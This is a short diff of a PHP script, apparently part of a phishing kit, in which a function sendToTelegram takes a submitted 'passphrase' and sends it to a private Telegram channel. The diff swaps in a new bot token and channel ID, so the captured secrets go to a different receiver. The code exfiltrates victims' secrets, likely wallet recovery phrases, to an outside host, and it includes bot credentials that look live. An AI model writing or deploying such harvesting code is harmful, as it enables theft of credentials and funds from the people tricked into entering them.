@@ -20,10 +20,10 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
 function sendToTelegram($passphrase) {
     // Telegram Bot API token
-    $botToken = "7265054014:AAGxCzsiSeBg3O3T6y7JAXoNZP4pWg0H5QY";
+    $botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
     
     // Your private channel ID (with -100 prefix)
-    $channelId = "-1002222609812";  // Replace with your actual channel ID
+    $channelId = "6542433272";  // Replace with your actual channel ID
 
     // The message you want to send
     $message = $passphrase;
